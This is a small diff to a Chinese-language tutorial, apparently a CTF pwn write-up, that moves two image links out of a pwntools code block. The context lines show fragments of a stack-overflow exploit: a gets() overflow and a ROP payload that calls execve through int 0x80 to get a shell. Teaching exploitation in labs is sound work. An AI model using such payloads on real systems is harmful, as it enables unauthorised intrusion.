@@ -106,6 +106,11 @@ gets(v4); // 向v4读入任意长度字符串，造成栈溢出
 ## 编写攻击脚本
 
 使用Python的`pwntools`库编写自动化攻击脚本：
+
+![](img/e72dcdc317660be84380036cd5037154_9.png)
+
+![](img/e72dcdc317660be84380036cd5037154_11.png)
+
 ```python
 from pwn import *
 
@@ -134,11 +139,6 @@ payload = flat([
     bin_sh_addr,       # ebx
     int80_addr
 ])
-
-![](img/e72dcdc317660be84380036cd5037154_9.png)
-
-![](img/e72dcdc317660be84380036cd5037154_11.png)
-
 p.sendline(payload)
 p.interactive() # 切换到交互模式，获得shell
 ```
